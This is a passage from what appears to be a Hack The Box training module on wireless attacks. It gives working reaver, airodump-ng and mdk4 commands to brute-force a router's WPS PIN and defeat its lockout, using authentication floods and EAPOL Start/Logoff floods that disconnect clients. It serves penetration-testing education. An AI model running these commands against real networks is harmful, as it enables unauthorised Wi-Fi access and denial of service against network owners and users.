
```sh
3kjS@htb[/htb]$ sudo reaver -l 100 -r 3:45 -i wlan0mon -b 60:38:E0:XX:XX:XX -c 11
```
#### Bypassing the WPS Reset Lock through MDK4

To begin this technique, we will need three terminals. In the first terminal, we will initiate the online bruteforcing attempt against the PIN.

```sh
3kjS@htb[/htb]$ sudo reaver -l 100 -r 3:45 -i wlan0mon -b 60:38:E0:XX:XX:XX -c 11
```

In the second terminal, we can monitor our `WPS Locked` status with `airodump-ng` and the `--wps` filter. We also specify our BSSID and channel, to exclude any additional access points from our list.

```sh
3kjS@htb[/htb]$ airodump-ng --wps --bssid 60:38:E0:XX:XX:XX -c 11 wlan0mon
```

```sh
3kjS@htb[/htb]$ sudo mdk4 wlan0mon a -a 60:38:E0:XX:XX:XX

Connecting Client BC:AC:DC:23:D1:31 to target AP 60:38:E0:XX:XX:XX
Packets sent:      1 - Speed:    1 packets/sec
Connecting Client 84:24:10:39:FD:D1 to target AP 60:38:E0:XX:XX:XX
Packets sent:   1618 - Speed: 1617 packets/sec
Connecting Client 8D:D3:44:A8:23:6B to target AP 60:38:E0:XX:XX:XX
```

```sh
3kjS@htb[/htb]$ sudo mdk4 wlan0mon a -i 60:38:E0:XX:XX:XX
```

In the third terminal, we have our choice of `EAPOL Start` or `EAPOL Logoff` messages. To use `EAPOL Start` messages, we run the following command.

```sh
3kjS@htb[/htb]$ mdk4 wlan0mon e -t 60:38:E0:XX:XX:XX
```

To use `EAPOL Logoff` messages to kick clients off the network, we can employ the command seen below.

```sh
3kjS@htb[/htb]$ mdk4 wlan0mon e -t 60:38:E0:XX:XX:XX -l
```

```sh
3kjS@htb[/htb]$ airodump-ng --wps --bssid 60:38:E0:XX:XX:XX -c 11 wlan0mon
```
